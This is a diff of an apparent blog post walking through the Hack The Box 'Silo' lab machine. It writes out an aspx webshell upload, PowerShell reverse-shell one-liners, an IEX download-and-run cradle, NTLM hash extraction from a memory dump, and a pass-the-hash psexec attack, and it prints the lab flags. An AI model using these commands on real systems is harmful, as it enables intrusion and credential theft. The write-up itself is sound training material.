@@ -119,46 +119,81 @@ msf5 auxiliary(admin/oracle/sid_brute) > run
 [*] Auxiliary module execution completed
 {% endhighlight %}
 
-Next, brute force the valid credentials.<br>
-To set up the Oracle client on Kali, we can read <a hreh="https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux">this page</a>
-We can find following username/password.
+Next, try some default credentials.<br>
+We can find the list in the <a href="https://docs.oracle.com/cd/B19306_01/install.102/b25300/rev_precon_db.htm">Oracle Database Installation Guide</a>.<br>
 {% highlight shell %}
-scott:tiger
-{% endhighlight %}
-{% highlight shell %}
+root@kali:/opt/oracle/instantclient_19_3# ./sqlplus SCOTT/tiger@10.10.10.82:1521/XE
 
-{% endhighlight %}
+SQL*Plus: Release 19.0.0.0.0 - Production on Wed Nov 6 18:24:53 2019
+Version 19.3.0.0.0
+
+Copyright (c) 1982, 2019, Oracle.  All rights reserved.
+
+ERROR:
+ORA-28002: the password will expire within 7 days
+
+
+
+Connected to:
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+
+SQL> 
+*{% endhighlight %}
 
 For the Oracle penetration testing, we can use a script "<a href="https://github.com/quentinhardy/odat">odat.py</a>".<br>
-Next, try to check if we have a write permission.
-{% highlight shell %}
-
-{% endhighlight %}
-{% highlight shell %}
-
-{% endhighlight %}
-
+It is not installed by default, we have to install with "apt-get"<br>
 Then, upload a aspx webshell which is installed on Kali linux by default.
 {% highlight shell %}
+root@kali:~# odat dbmsadvisor -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --putFile C:\\inetpub\\wwwroot cmdasp.aspx /usr/share/webshells/aspx/cmdasp.aspx 
 
+[1] (10.10.10.82:1521): Put the /usr/share/webshells/aspx/cmdasp.aspx local file in the C:\inetpub\wwwroot path (named cmdasp.aspx) of the 10.10.10.82 server
+[+] The /usr/share/webshells/aspx/cmdasp.aspx local file was put in the remote C:\inetpub\wwwroot path (named cmdasp.aspx)
 {% endhighlight %}
-![placeholder](https://inar1.github.io/public/images/2019-11-07/silo-badge.png)
+![placeholder](https://inar1.github.io/public/images/2019-11-07/2019-11-06-18-39-38.png)
 
 To launch a netcat listener to receive a reverse shell.
 {% highlight shell %}
+root@kali:~# nc -nlvp 443
+listening on [any] 443 ...
 
 {% endhighlight %}
 
 For the reverse shell, we can use <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1">this Powershell script</a>.<br>
+{% highlight shell %}
+#A simple and small reverse shell. Options and help removed to save space. 
+#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
+$client = New-Object System.Net.Sockets.TCPClient('192.168.254.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+$sm=(New-Object Net.Sockets.TCPClient('192.168.254.1',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
+{% endhighlight %}
+
+Next, run a simple web server that hosts the powershell script.
+{% highlight shell %}
+root@kali:~# ls -l | grep Invoke
+-rw-r--r-- 1 root root  973 Nov  6 18:47 Invoke-PowerShellTcpOneLine.ps1
+
+root@kali:~# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+
+{% endhighlight %}
+
 To use it, we have to run following command with the webshell.
 {% highlight shell %}
-powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.15.48:8083/Invoke-PowerShellTcp.ps1')
+powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.13/Invoke-PowerShellTcpOneLine.ps1')
 {% endhighlight %}
 
 Now we got a reverse shell.<br>
 user.txt is in the directory "Directory: C:\users\Phineas\Desktop".
 {% highlight shell %}
+root@kali:~# nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.13] from (UNKNOWN) [10.10.10.82] 49174
+cwd
+PS C:\windows\system32\inetsrv> whoami
+iis apppool\defaultapppool
 
+PS C:\windows\system32\inetsrv> type C:\users\Phineas\Desktop\user.txt
+92ede778a1cc8d27cb6623055c331617
 {% endhighlight %}
 
 
@@ -166,31 +201,144 @@ user.txt is in the directory "Directory: C:\users\Phineas\Desktop".
 
 There is another file in the same directory which name is "Oracle issue.txt" with password.
 {% highlight shell %}
+PS C:\users\Phineas\Desktop> dir
 
+
+    Directory: C:\users\Phineas\Desktop
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-a---          1/5/2018  10:56 PM        300 Oracle issue.txt                  
+-a---          1/4/2018   9:41 PM         32 user.txt                          
+
+
+PS C:\users\Phineas\Desktop> type "Oracle issue.txt"
+Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):
+
+Dropbox link provided to vendor (and password under separate cover).
+
+Dropbox link 
+https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0
+
+link password:
+?%Hm8646uC$
 {% endhighlight %}
 
 Then, try to access to the dropbox.<br>
-![placeholder](https://inar1.github.io/public/images/2019-11-07/silo-badge.png)
+However, above password doesn't work. To obtain a correct password, we need to use the webshell which we uploaded.<br>
+After that, download the file "SILO-20180105-221806.zip".
+{% highlight shell %}
+£%Hm8646uC$
+{% endhighlight %}
+![placeholder](https://inar1.github.io/public/images/2019-11-07/2019-11-06-19-06-31.png)
+![placeholder](https://inar1.github.io/public/images/2019-11-07/2019-11-06-19-08-14.png)
 
 By unzip, we can get a file which contains memory dump.<br>
-We can use "volatility" to do the investigation.
+We can use "<a href="https://github.com/volatilityfoundation/volatility">volatility</a>" which is installed by default to do the investigation.<br>
+At first, dump the general information of "SILO-20180105-221806.dmp".
 {% highlight shell %}
+root@kali:~# volatility kdbgscan -f SILO-20180105-221806.dmp
+Volatility Foundation Volatility Framework 2.6
+WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
 
+~~~
+
+**************************************************
+Instantiating KDBG using: Unnamed AS Win2012x64 (6.2.9201 64bit)
+Offset (V)                    : 0xf80078520a30
+Offset (P)                    : 0x2320a30
+KdCopyDataBlock (V)           : 0xf8007845f9b0
+Block encoded                 : Yes
+Wait never                    : 0xd08e8400bd4a143a
+Wait always                   : 0x17a949efd11db80
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win2012x64
+Version64                     : 0xf80078520d90 (Major: 15, Minor: 9600)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 9600.16384.amd64fre.winblue_rtm.
+PsActiveProcessHead           : 0xfffff80078537700 (51 processes)
+PsLoadedModuleList            : 0xfffff800785519b0 (148 modules)
+KernelBase                    : 0xfffff8007828a000 (Matches MZ: True)
+Major (OptionalHeader)        : 6
+Minor (OptionalHeader)        : 3
+KPCR                          : 0xfffff8007857b000 (CPU 0)
+KPCR                          : 0xffffd000207e8000 (CPU 1)
+
+~~~
+
+{% endhighlight %}
+
+We figured out the OS is "Windows server 2012 64bit".<br>
+Then, see the content of memory dump.
+{% highlight shell %}
+root@kali:~# volatility -f SILO-20180105-221806.dmp --profile=Win2012R2x64 hivelist
+Volatility Foundation Volatility Framework 2.6
+Virtual            Physical           Name
+------------------ ------------------ ----
+0xffffc0000100a000 0x000000000d40e000 \??\C:\Users\Administrator\AppData\Local\Microsoft\Windows\UsrClass.dat
+0xffffc000011fb000 0x0000000034570000 \SystemRoot\System32\config\DRIVERS
+0xffffc00001600000 0x000000003327b000 \??\C:\Windows\AppCompat\Programs\Amcache.hve
+0xffffc0000001e000 0x0000000000b65000 [no name]
+0xffffc00000028000 0x0000000000a70000 \REGISTRY\MACHINE\SYSTEM
+0xffffc00000052000 0x000000001a25b000 \REGISTRY\MACHINE\HARDWARE
+0xffffc000004de000 0x0000000024cf8000 \Device\HarddiskVolume1\Boot\BCD
+0xffffc00000103000 0x000000003205d000 \SystemRoot\System32\Config\SOFTWARE
+0xffffc00002c43000 0x0000000028ecb000 \SystemRoot\System32\Config\DEFAULT
+0xffffc000061a3000 0x0000000027532000 \SystemRoot\System32\Config\SECURITY
+0xffffc00000619000 0x0000000026cc5000 \SystemRoot\System32\Config\SAM
+0xffffc0000060d000 0x0000000026c93000 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
+0xffffc000006cf000 0x000000002688f000 \SystemRoot\System32\Config\BBI
+0xffffc000007e7000 0x00000000259a8000 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
+0xffffc00000fed000 0x000000000d67f000 \??\C:\Users\Administrator\ntuser.dat
 {% endhighlight %}
 
 We found a some files should be confidential.<br>
 To dump the hash, wehave to provide the needed addresses for SYSTEM and SAM.
 {% highlight shell %}
-
+root@kali:~# volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump -y 0xffffc00000028000 -s 0xffffc00000619000
+Volatility Foundation Volatility Framework 2.6
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::
 {% endhighlight %}
 
 Since we can use Pass the Hash technique for Windows,<br>
-we can achieve a SYSTEM shell with following command.
+we can achieve a SYSTEM shell with metasploit psexec module.
 {% highlight shell %}
+msf5 > use exploit/windows/smb/psexec
+msf5 exploit(windows/smb/psexec) > set smbuser Administrator
+smbuser => Administrator
+msf5 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7
+smbpass => aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7
+msf5 exploit(windows/smb/psexec) > set rhost 10.10.10.82
+rhost => 10.10.10.82
+msf5 exploit(windows/smb/psexec) > run
 
+[*] Started reverse TCP handler on 10.10.14.13:4444 
+[*] 10.10.10.82:445 - Connecting to the server...
+[*] 10.10.10.82:445 - Authenticating to 10.10.10.82:445 as user 'Administrator'...
+[*] 10.10.10.82:445 - Selecting PowerShell target
+[*] 10.10.10.82:445 - Executing the payload...
+[+] 10.10.10.82:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (180291 bytes) to 10.10.10.82
+[*] Meterpreter session 1 opened (10.10.14.13:4444 -> 10.10.10.82:49175) at 2019-11-06 19:24:15 +0200
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > 
 {% endhighlight %}
 
 As always, root.txt is in the directory "C:\Users\Administrator\Desktop".
 {% highlight shell %}
+meterpreter > shell
+Process 1884 created.
+Channel 1 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
 
+C:\Windows\system32>type C:\users\administrator\desktop\root.txt
+type C:\users\administrator\desktop\root.txt
+cd39ea0af657a495e33bc59c7836faf6
+C:\Windows\system32>
 {% endhighlight %}
